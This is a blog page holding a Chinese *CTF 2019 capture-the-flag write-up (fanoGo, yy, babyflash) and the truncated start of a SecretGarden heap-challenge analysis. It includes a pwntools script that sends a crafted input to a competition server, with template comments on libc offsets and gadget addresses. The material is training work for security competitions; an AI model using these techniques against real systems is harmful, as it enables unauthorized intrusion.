<!DOCTYPE html>












  


<html class="theme-next muse use-motion" lang>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
























<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">

<link rel="stylesheet" href="/css/main.css?v=7.1.2">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.2">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.2">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.2">


  <link rel="mask-icon" href="/images/logo.svg?v=7.1.2" color="#222">







<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '7.1.2',
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
    back2top: true,
    back2top_sidebar: false,
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta property="og:type" content="website">
<meta property="og:title" content="idongxia">
<meta property="og:url" content="https://idongxia.github.io/index.html">
<meta property="og:site_name" content="idongxia">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="idongxia">





  
  
  <link rel="canonical" href="https://idongxia.github.io/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>idongxia</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">idongxia</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Navigationsleiste an/ausschalten">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home menu-item-active">

    
    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>

  </li>

      
      
    </ul>
  

  
    

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://idongxia.github.io/2019/06/06/xinCTFwriteup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="idongxia">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="idongxia">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/06/06/xinCTFwriteup/" class="post-title-link" itemprop="url">Unbenannt</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2019-06-06 16:28:42" itemprop="dateCreated datePublished" datetime="2019-06-06T16:28:42+08:00">2019-06-06</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Bearbeitet am</span>
                
                <time title="Geändert am: 2019-05-01 11:00:37" itemprop="dateModified" datetime="2019-05-01T11:00:37+08:00">2019-05-01</time>
              
            
          </span>

          

          
            
            
              
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
            
                <span class="post-meta-item-text">Kommentare: </span>
                <a href="/2019/06/06/xinCTFwriteup/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2019/06/06/xinCTFwriteup/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="ctf-writeup"><a href="#ctf-writeup" class="headerlink" title="*ctf writeup"></a>*ctf writeup</h1><p>[TOC]</p>
<h2 id="0x01-fanoGo"><a href="#0x01-fanoGo" class="headerlink" title="0x01 fanoGo"></a>0x01 fanoGo</h2><h4 id="1-1-发现"><a href="#1-1-发现" class="headerlink" title="1.1 发现"></a>1.1 发现</h4><p>​    1、拖进ida，静态编译发现很乱，go语言编译出来的第一次看，只能自己在用go语言编译一个出来分析，来一点点对应，去除不需要分析的部分。</p>
<p>​    <img src="//idongxia.github.io/2019/06/06/xinCTFwriteup/1556675832893.png" alt="1556675832893"></p>
<p>​    2、顺着看大概把流程看懂了，如下图，一开始先读取corpus.txt文件：</p>
<p><img src="//idongxia.github.io/2019/06/06/xinCTFwriteup/1556675908786.png" alt="1556675908786"></p>
<p>​    然后干一些不可描述的事情，没看懂，这不重要。。</p>
<p>​    3、定位到程序输入的点：</p>
<p>​    say something!</p>
<p><img src="//idongxia.github.io/2019/06/06/xinCTFwriteup/1556675988079.png" alt="1556675988079"></p>
<p>​    这里会让我输入一串东西，我一开始也不知道是什么，继续往下看，看怎么对它进行处理。</p>
<p>​    4、经过继续静态分析和一些动态调试，大概确定输入的东西会被以下两个函数处理：</p>
<p><img src="//idongxia.github.io/2019/06/06/xinCTFwriteup/1556676118479.png" alt="1556676118479"></p>
<p>​    根据符号的字面意思，应该是fano编码，继续玩下分析。</p>
<p>​    5、继续分析发现关键点，如下图：</p>
<p><img src="//idongxia.github.io/2019/06/06/xinCTFwriteup/1556676234931.png" alt="1556676234931"></p>
<p>​    可以看到v30如果不为0就可以输出flag，而v30的赋值在前面的一个判断中，所以我们要确保e._type==0x15A成立，而图中”If you connot ….”这段话刚好是0x15A长度，结合前面的fano_encode于是我就猜到了大概思路。</p>
<h4 id="1-2-程序流程"><a href="#1-2-程序流程" class="headerlink" title="1.2 程序流程"></a>1.2 程序流程</h4><p>​    这里说一下大概思路，程序的流程是：</p>
<p>​    1、输入一个字符串</p>
<p>​    2、使用fano_encode处理这个字符串（上网查是香农-范洛编码）</p>
<p>​    3、将处理结果和0x15a长度的字符串作比较,一样则输出flag</p>
<p>​    所以，这里的关键是知道fano_encode是怎么做的，但是仔细去分析这个函数太麻烦了，所以就想到加密解密函数应该成对存在，在ida一搜，还真有：</p>
<p>​    <img src="//idongxia.github.io/2019/06/06/xinCTFwriteup/1556676712202.png" alt="1556676712202"></p>
<p>​    所以有了具体的解题思路。</p>
<h4 id="1-3-思路"><a href="#1-3-思路" class="headerlink" title="1.3 思路"></a>1.3 思路</h4><p>​    1、作为pwn选手，首先会patch一个程序，于是把fano_encode这个函数改成了fano_decode函数，通过输入那个0x15a长度的字符串，gdb动调得到加密后的字符串，dump下来</p>
<p>​    2、写一个脚本，将加密后的字符串发送给服务器，搞定！</p>
<h4 id="1-4-代码"><a href="#1-4-代码" class="headerlink" title="1.4 代码"></a>1.4 代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#version 6 by tempo</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.clear(arch = 'amd64')</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">proc_name = <span class="string">'fanoGo.bak'</span></span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span> <span class="comment">#'/lib/x86_64-linux-gnu/libc-2.23.so'</span></span><br><span class="line">ip_addr = <span class="string">"34.92.37.22:10001"</span> <span class="comment">#/lib32/libc-2.23.so</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="comment">#-------------------no change this----------------------</span></span><br><span class="line">elf = ELF(<span class="string">'./&#123;&#125;'</span>.format(proc_name))</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> len(libc_name) ==<span class="number">0</span>:</span><br><span class="line">        r = process(<span class="string">'./&#123;&#125;'</span>.format(proc_name))</span><br><span class="line">        libc = r.libc</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = process(<span class="string">'./&#123;&#125;'</span>.format(proc_name), env = &#123;<span class="string">"LD_PRELOAD"</span>: libc_name&#125;)</span><br><span class="line">        libc = ELF(libc_name)</span><br><span class="line">    <span class="comment">#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r=remote(ip_addr.split(<span class="string">":"</span>)[<span class="number">0</span>],ip_addr.split(<span class="string">":"</span>)[<span class="number">1</span>])</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"><span class="comment">#[0x45216,0x4526a,0xf02a4,0xf1147] 0x555555757000 0x7ffff7a0d000 0x555555554000 next search recvline interactive payload send sendline sendlineafter sendafter recvuntil recv recvall ljust format symbols success got plt p64 p32 hex</span></span><br><span class="line"><span class="comment"># #第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class="line"><span class="comment"># obj = LibcSearcher("fgets", 0X7ff39014bd90)</span></span><br><span class="line"><span class="comment"># obj.dump("system")        #system 偏移</span></span><br><span class="line"><span class="comment">#------------------------------------------------</span></span><br><span class="line"><span class="comment"># gdb.attach(r,"b *0x4019F6")</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"1.file"</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    payload = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "If you cannot read all your books...fondle them---peer into them, let them fall open where they will, read from the first sentence that arrests the eye, set them back on the shelves with your own hands, arrange them on your own plan so that you at least know where they are. Let them be your friends; let them, at any rate, be your acquaintances."</span></span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">"Say something:"</span>,payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>脚本中有用的就后面几行，前面的是做pwn题的脚本模板，用来远程连接题目的。其中的1.file这里放个图片就好了：</p>
<p><img src="//idongxia.github.io/2019/06/06/xinCTFwriteup/1556677045158.png" alt="1556677045158"></p>
<p>也就是将这个字符串发送给服务器，就得到flag.</p>
<h4 id="1-5-解题效果"><a href="#1-5-解题效果" class="headerlink" title="1.5 解题效果"></a>1.5 解题效果</h4><p><img src="//idongxia.github.io/2019/06/06/xinCTFwriteup/1556677116411.png" alt="1556677116411"></p>
<h2 id="0x02-yy"><a href="#0x02-yy" class="headerlink" title="0x02 yy"></a>0x02 yy</h2><h4 id="2-1-发现"><a href="#2-1-发现" class="headerlink" title="2.1 发现"></a>2.1 发现</h4><p>​    1、拖进ida静态分析，结合gdb动调，读懂大概流程，读入一个字符串，并yyparse来处理：</p>
<p><img src="//idongxia.github.io/2019/06/06/xinCTFwriteup/1556677293795.png" alt="1556677293795"></p>
<p>​    2、一开始不知道yy开头的函数是什么，还自己进了yy函数里面分析，简直身无可恋。后来觉得不对，将yylex放上去搜，以下就知道是lex词法分析器。orz。。。</p>
<p>​    3、发现关键点：</p>
<p><img src="//idongxia.github.io/2019/06/06/xinCTFwriteup/1556677976063.png" alt="1556677976063"></p>
<p>​    如上图，找到了成功的地方，于是动调memcmp，发现是两个不知道什么的字符串再进行比较，比较长度0xa0.</p>
<p>​    4、因为题目要我们输入flag，于是我们猜测*CTF{}是他的格式，所以我们尝试：</p>
<p><img src="//idongxia.github.io/2019/06/06/xinCTFwriteup/1556678123498.png" alt="1556678123498"></p>
<p>​    如图，发现猜对了，但是并不是所有这种格式的可以成功，经过动调，结合yylex内的语法规则，发现花括号内的字符包括</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abcdefghijklmnopqrstuvwxyz0123456789_</span><br></pre></td></tr></table></figure>

<p>​    yylex经过注释后如下图：</p>
<p><img src="//idongxia.github.io/2019/06/06/xinCTFwriteup/1556678260570.png" alt="1556678260570"></p>
<p>所以猜测flag是由以上这些字符组成。</p>
<p>​    5、目前我们不知道字符串是怎么被处理的，然后再swith中发现了这个：</p>
<p><img src="//idongxia.github.io/2019/06/06/xinCTFwriteup/1556678345518.png" alt="1556678345518"></p>
<p>​    然后利用ida的发现加密的插件findcrypt，找到了aes加密的s盒：</p>
<p><img src="//idongxia.github.io/2019/06/06/xinCTFwriteup/1556678402953.png" alt="1556678402953"></p>
<p>​    猜测这个是aes加密，经过后续的动调发现时aes-cbc加密，程序流程分析清楚。</p>
<h4 id="2-2-程序流程"><a href="#2-2-程序流程" class="headerlink" title="2.2 程序流程"></a>2.2 程序流程</h4><p>​    概括程序流程：</p>
<p>​    1、输入一个字符串</p>
<p>​    2、经过yylex词法分析器的检测，如果不符合*CTF{xxxx}的格式会提示syntax error，其中xxxx包括小写字母和数字还有下划线</p>
<p>​    3、将输入的字符串按照下划线_进行分段，经过数值初始化append、字符替换和aes-cbc加密后，与程序中的加密字段进行比较</p>
<p>​    4、比较成功，则输入为flag.</p>
<h4 id="2-3-思路"><a href="#2-3-思路" class="headerlink" title="2.3 思路"></a>2.3 思路</h4><p>​    1、将存储在程序中最后进行对比操作的密文用aes-cbc解密，iv设为0,得到明文如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">e5e5258631ab6eafb114fe76783d1eff </span><br><span class="line">11d65e864f6b675eb114fe76783d1eff </span><br><span class="line">6b4e258631ab6eafb114fe76783d1eff </span><br><span class="line">1d6f478a31ab6eafb114fe76783d1eff </span><br><span class="line">825e8a8631ab6eafb114fe76783d1eff </span><br><span class="line">5e67258631ab6eafb114fe76783d1eff </span><br><span class="line">5eeded8a31ab6eafb114fe76783d1eff </span><br><span class="line">4f37258631ab6eafb114fe76783d1eff </span><br><span class="line">47ed58ed474eedafb114fe76783d1eff</span><br></pre></td></tr></table></figure>

<p>​    2、找到字符替换表，将每个字符替换回来，字符替换表如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">.data:00000000002062E0 box             db 82h         a         ; DATA XREF: yyparse+575↑r</span><br><span class="line">.data:00000000002062E1 byte_2062E1     db 5           b         ; DATA XREF: yyparse+59D↑r</span><br><span class="line">.data:00000000002062E2 byte_2062E2     db 86h         c         ; DATA XREF: yyparse+5C5↑r</span><br><span class="line">.data:00000000002062E3 byte_2062E3     db 8Ah          d        ; DATA XREF: yyparse+5ED↑r</span><br><span class="line">.data:00000000002062E4 byte_2062E4     db 0Bh         e         ; DATA XREF: yyparse+615↑r</span><br><span class="line">.data:00000000002062E5 byte_2062E5     db 11h         f         ; DATA XREF: yyparse+63D↑r</span><br><span class="line">.data:00000000002062E6 byte_2062E6     db 96h        g          ; DATA XREF: yyparse+665↑r</span><br><span class="line">.data:00000000002062E7 byte_2062E7     db 1Dh         h         ; DATA XREF: yyparse+68D↑r</span><br><span class="line">.data:00000000002062E8 byte_2062E8     db 27h        i          ; DATA XREF: yyparse+6B5↑r</span><br><span class="line">.data:00000000002062E9 byte_2062E9     db 0A9h        j         ; DATA XREF: yyparse+6DD↑r</span><br><span class="line">.data:00000000002062EA byte_2062EA     db 2Bh          k        ; DATA XREF: yyparse+705↑r</span><br><span class="line">.data:00000000002062EB byte_2062EB     db 0B1h         l        ; DATA XREF: yyparse+72D↑r</span><br><span class="line">.data:00000000002062EC byte_2062EC     db 0F3h         m        ; DATA XREF: yyparse+755↑r</span><br><span class="line">.data:00000000002062ED byte_2062ED     db 5Eh          n        ; DATA XREF: yyparse+77D↑r</span><br><span class="line">.data:00000000002062EE byte_2062EE     db 37h          o        ; DATA XREF: yyparse+7A5↑r</span><br><span class="line">.data:00000000002062EF byte_2062EF     db 38h          p        ; DATA XREF: yyparse+7CD↑r</span><br><span class="line">.data:00000000002062F0 byte_2062F0     db 0C2h        q         ; DATA XREF: yyparse+7F5↑r</span><br><span class="line">.data:00000000002062F1 byte_2062F1     db 47h         r         ; DATA XREF: yyparse+81D↑r</span><br><span class="line">.data:00000000002062F2 byte_2062F2     db 4Eh          s        ; DATA XREF: yyparse+845↑r</span><br><span class="line">.data:00000000002062F3 byte_2062F3     db 4Fh          t        ; DATA XREF: yyparse+86D↑r</span><br><span class="line">.data:00000000002062F4 byte_2062F4     db 0D6h         u        ; DATA XREF: yyparse+895↑r</span><br><span class="line">.data:00000000002062F5 byte_2062F5     db 58h          v        ; DATA XREF: yyparse+8BD↑r</span><br><span class="line">.data:00000000002062F6 byte_2062F6     db 0DEh         w        ; DATA XREF: yyparse+8E5↑r</span><br><span class="line">.data:00000000002062F7                 db 0E2h         x        ; DATA XREF: yyparse+90D↑r</span><br><span class="line">.data:00000000002062F8                 db 0E5h         y        ; DATA XREF: yyparse+935↑r</span><br><span class="line">.data:00000000002062F9                 db 0E6h         z        ; DATA XREF: yyparse+95D↑r</span><br><span class="line">.data:00000000002062FA                 db  67h ; g     0        ; DATA XREF: yyparse+985↑r</span><br><span class="line">.data:00000000002062FB                 db  6Bh ; k     1        ; DATA XREF: yyparse+9AD↑r</span><br><span class="line">.data:00000000002062FC                 db 0ECh         2        ; DATA XREF: yyparse+9D5↑r</span><br><span class="line">.data:00000000002062FD                 db 0EDh         3        ; DATA XREF: yyparse+9FD↑r</span><br><span class="line">.data:00000000002062FE byte_2062FE     db 6Fh          4        ; DATA XREF: yyparse+A25↑r</span><br><span class="line">.data:00000000002062FF byte_2062FF     db 0F2h         5        ; DATA XREF: yyparse+A4D↑r</span><br><span class="line">.data:0000000000206300 byte_206300     db 73h          6        ; DATA XREF: yyparse+A75↑r</span><br><span class="line">.data:0000000000206301 byte_206301     db 0F5h         7        ; DATA XREF: yyparse+A9A↑r</span><br><span class="line">.data:0000000000206302 byte_206302     db 77h          8        ; DATA XREF: yyparse+ABF↑r</span><br><span class="line">.data:0000000000206303 byte_206303     db 7Fh          9        ; DATA XREF: yyparse+AE4↑r</span><br></pre></td></tr></table></figure>

<p>​    表示0x82其实就是字符a，解出来的密文开头是0xe5e5，表示的就是yy两个字符，再结合下划线截断，可以手工对照逐个字符翻译，就是这么蠢的做法..orz……，翻译后的表如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">e5e5258631ab6eafb114fe76783d1eff yy_</span><br><span class="line">11d65e864f6b675eb114fe76783d1eff funct10n_</span><br><span class="line">6b4e258631ab6eafb114fe76783d1eff 1s_</span><br><span class="line">1d6f478a31ab6eafb114fe76783d1eff h4rd_</span><br><span class="line">825e8a8631ab6eafb114fe76783d1eff and_</span><br><span class="line">5e67258631ab6eafb114fe76783d1eff n0_</span><br><span class="line">5eeded8a31ab6eafb114fe76783d1eff n33d_</span><br><span class="line">4f37258631ab6eafb114fe76783d1eff to_</span><br><span class="line">47ed58ed474eedafb114fe76783d1eff r3v3rs3</span><br></pre></td></tr></table></figure>

<p>所以最后的flag就是结合体：*CTF{yy_funct10n_1s_h4rd_and_n0_n33d_to_r3v3rs3}</p>
<h2 id="0x03-babyflash"><a href="#0x03-babyflash" class="headerlink" title="0x03 babyflash"></a>0x03 babyflash</h2><h4 id="3-1-发现"><a href="#3-1-发现" class="headerlink" title="3.1 发现"></a>3.1 发现</h4><p>​    misc题目靠脑洞，拿到一个flash文件，用JPEXS Free Flash Decompiler工具进行资源提取，提取处441张黑白图片和一个MP3音频文件，首先就是黑白图片想到二维码，音频想到频谱分析。好其实到这里题目就做完了，开始具体分析。</p>
<h4 id="3-2-思路"><a href="#3-2-思路" class="headerlink" title="3.2 思路"></a>3.2 思路</h4><p>​    1、得到的图片如下图：</p>
<p><img src="//idongxia.github.io/2019/06/06/xinCTFwriteup/1556679200000.png" alt="1556679200000"></p>
<p>​    发现441刚好是21的平方，所以笃定是二维码，写个脚本出图：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import os</span><br><span class="line">from PIL import Image</span><br><span class="line">txt=&quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1000):</span><br><span class="line">	filePath = &quot;./123/images/&#123;&#125;.png&quot;.format(i)</span><br><span class="line">	if os.path.exists(filePath):</span><br><span class="line">		fsize = os.path.getsize(filePath)</span><br><span class="line">		if fsize == 112:</span><br><span class="line">			txt+=&apos;1&apos;</span><br><span class="line">		else:</span><br><span class="line">			txt+=&apos;0&apos;</span><br><span class="line"></span><br><span class="line">print len(txt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">im=Image.new(&apos;RGB&apos;,(21,21))</span><br><span class="line">pix = im.load()</span><br><span class="line">for x in xrange(len(txt)):</span><br><span class="line">    if txt[x] == &apos;1&apos;:</span><br><span class="line">        pix[x/21,x%21]=(0,0,0)</span><br><span class="line">    else:</span><br><span class="line">        pix[x/21,x%21]=(255,255,255)</span><br><span class="line">im.show()</span><br><span class="line">im.save(&apos;1.png&apos;)</span><br></pre></td></tr></table></figure>

<p>​    得到的二维码如下：</p>
<p><img src="//idongxia.github.io/2019/06/06/xinCTFwriteup/1556679301931.png" alt="1556679301931"></p>
<p>​    放大后进行识别，得到一半flag:</p>
<p><img src="//idongxia.github.io/2019/06/06/xinCTFwriteup/1556679327211.png" alt="1556679327211"></p>
<p>​    2、MP3音频放到audacity程序中进行常规频谱分析，得到另一半flag  “&amp;_the_rest}” </p>
<p><img src="//idongxia.github.io/2019/06/06/xinCTFwriteup/1556679625163.png" alt="1556679625163"></p>
<p>结合后得到整个flag</p>
<p>*ctf{half_flag_&amp;&amp;_the_rest}</p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://idongxia.github.io/2019/06/06/secretgarden/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="idongxia">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="idongxia">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/06/06/secretgarden/" class="post-title-link" itemprop="url">SecretGarden</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2019-06-06 11:59:16" itemprop="dateCreated datePublished" datetime="2019-06-06T11:59:16+08:00">2019-06-06</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Bearbeitet am</span>
                
                <time title="Geändert am: 2019-06-04 11:46:45" itemprop="dateModified" datetime="2019-06-04T11:46:45+08:00">2019-06-04</time>
              
            
          </span>

          

          
            
            
              
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
            
                <span class="post-meta-item-text">Kommentare: </span>
                <a href="/2019/06/06/secretgarden/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2019/06/06/secretgarden/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="程序安全性检查"><a href="#程序安全性检查" class="headerlink" title="程序安全性检查"></a>程序安全性检查</h3><img src="//idongxia.github.io/2019/06/06/secretgarden/checksec.png" style="zoom:50">

<h3 id="程序功能分析"><a href="#程序功能分析" class="headerlink" title="程序功能分析"></a>程序功能分析</h3><p>程序主要功能</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"  1 . Raise a flower "</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"  2 . Visit the garden "</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"  3 . Remove a flower from the garden"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"  4 . Clean the garden"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"  5 . Leave the garden"</span>);</span><br></pre></td></tr></table></figure>

<h4 id="Raise-a-flower"><a href="#Raise-a-flower" class="headerlink" title="Raise a flower"></a><code>Raise a flower</code></h4><ol>
<li>该函数会先判断<code>flower</code>的数目,不能超过<code>0x63</code></li>
<li>成功后，申请一个内存块,大小为<code>0x28</code>的结构体，并填0。</li>
